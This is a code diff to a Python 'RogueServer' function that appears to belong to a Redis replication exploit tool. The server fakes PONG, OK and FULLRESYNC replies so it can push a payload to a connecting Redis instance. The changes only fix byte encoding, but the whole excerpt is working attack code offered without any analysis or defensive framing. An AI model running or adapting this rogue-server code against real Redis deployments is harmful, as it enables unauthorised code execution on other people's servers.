@@ -18,18 +18,17 @@ def RogueServer(lport):
     while True:
         data = conn.recv(1024)
         if b"PING" in data:
-            resp="+PONG"+CLRF
+            resp=bytes("+PONG"+CLRF,'utf-8')
             conn.send(resp)
         elif b"REPLCONF" in data:
-            resp="+OK"+CLRF
+            resp=bytes("+OK"+CLRF,'utf-8')
             conn.send(resp)
         elif b"PSYNC" in data or b"SYNC" in data:
-            resp =  "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
-            resp += "$" + str(len(payload)) + CLRF
-            resp = resp.encode()
+            resp =  bytes("+FULLRESYNC " + "Z"*40 + " 1" + CLRF+"$"+str(len(payload)) + CLRF,'utf-8')
+            # resp = resp.encode()
             resp += payload + CLRF.encode()
-            if type(resp) != bytes:
-                resp =resp.encode()
+            # if type(resp) != bytes:
+                # resp =resp.encode()
             conn.send(resp)
         #elif "exit" in data:
             break
